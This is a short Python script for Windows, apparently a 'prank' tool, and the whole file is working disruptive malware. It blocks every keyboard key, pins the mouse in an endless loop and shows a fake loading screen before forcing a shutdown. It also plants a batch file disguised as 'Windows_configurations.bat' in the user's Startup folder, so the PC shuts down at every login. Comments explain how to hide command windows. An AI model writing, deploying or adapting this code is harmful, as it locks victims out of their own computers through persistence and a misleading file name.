import sys,os,subprocess,time
import keyboard,mouse,threading
import pyautogui
from pygame import mixer


si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW #Invisible Terminal. idk why i added it, bc i dont really use it in this program but u culd type subprocess.Popen("command",startupinfo=si) to execute a command without a visible terminal
mixer.init() # u could add weard sounds to that too!

def writeslow(text,timetosleep: float = 0.1):
    for letter in text:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(timetosleep)

def FakeTerminal():
    text = """
  LOADING   
"""# But ascii art in here if u want
    print(text)


def clearscreen():
    os.system("cls")

def fullscreen():
    pyautogui.keyDown("WIN")
    pyautogui.press('up')
    pyautogui.keyUp("WIN")

def writefilesinstartup():
    user = os.getlogin()
    file = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"# change this file to C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp if u want
    startupfile = open(f"{file}/Windows_configurations.bat",'w')
    startupfile.write("shutdown -s -t 0")
    startupfile.close()



writefilesinstartup()
clearscreen()
fullscreen()
FakeTerminal()
writeslow("██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████",0.01)
for i in range(150):
    keyboard.block_key(i) # ok this is interesting, bc this goes through every single key on ur keyboard and blocks the input

def move_mouse():
    while True:
        mouse.move(1,0, absolute=True, duration=0) # this is moving the mouse to 1,0 very fast so u cant move ur mouse. u could press the mouse buttons but thas all

threading.Thread(target=move_mouse).start() # this is starting a thread for the mouseblocker
clearscreen()
writeslow('YOUR PC IS GOING TO SHUTDOWN. U COULD PRESS STRG+ALT+ENTF TO STOP THE SHUTDOWN BUT THE .BAT FILE IS STILL IN UR STARTUP SO GO DELETE IT')
time.sleep(10)
os.system("shutdown -s -t 0")
